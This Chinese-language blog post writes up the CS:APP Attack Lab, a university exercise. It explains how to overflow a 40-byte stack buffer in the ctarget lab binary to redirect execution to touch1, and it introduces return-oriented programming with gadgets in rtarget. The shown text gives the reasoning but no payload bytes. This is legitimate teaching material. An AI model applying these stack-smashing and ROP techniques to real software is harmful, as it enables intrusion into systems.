csapp_libs: attacklib

发表于 2019-11-27 | | 阅读次数:

实验简介

本实验的实验材料为具有漏洞的二进制，要求通过缓冲区溢出攻击，还有ROP（Return-oriented programming）的方式，来达到注入逻辑或者说修改预期行为的目的。

本实验的主要材料有：

  • 一个hex2raw二进制用于将十六进制小端表示法转换为字节。
  • 一个ctarget二进制，该二进制为前3个阶段的实验对象，该二进制容易受到缓冲区溢出攻击。
  • 一个rtarget二进制，该二进制为最后两个阶段的实验对象，该二进制容易受到ROP攻击。

阶段一

介绍

该实验的目标为通过缓冲区溢出攻击让程序调用本不该调用到的touch1函数。

已知ctarget会调用test函数。

Gets是一个从标准输入读取字符串然后存储在一个指定的地方的函数，会自动为字符串最后加上’/0’。

思路

根据实验材料中的已知条件，大概的实现思路就是通过覆盖上一层调用栈中的返回地址让getbuf()函数返回时不再返回test()而是直接返回到touch1()的首个指令地址。

实现

先通过gdb来运行二进制查看一下如何构造指定的字符串。因为BUFFER_SIZE这个常量还未知，所以先看下getbuf的实现。

可以看到在调用Gets之前该函数在栈上分配了40个字节的空间，根据书本上的内容，在这40个字节之上紧邻的应该就是returnAddress。可以验证一下，目前我们在getbuf函数的第一个指令，还没操作栈指针，尝试输出一下此时栈指针指向的内容：

阶段四

介绍

阶段4中使用的二进制为rtarget，该二进制加入了栈随机化、并且标记了栈内存中不可执行代码，的防御措施，所以像前面几个阶段通过注入代码的方式将失效。

但是，即使栈地址不再固定，但是内存中的.text段，即代码段经过链接地址都已经重定向完成，所以我们可以利用已存在的代码片段来进行实现逻辑，其中ROP（Return-Oriented Programming）就是这样一种攻击手段。

已知在rtarget中，由start_farm和end_farm来界限的一块代码区域中存在漏洞可被利用的代码片段，阶段4要求利用gadget farm中的代码来完成调用touch2的目标。
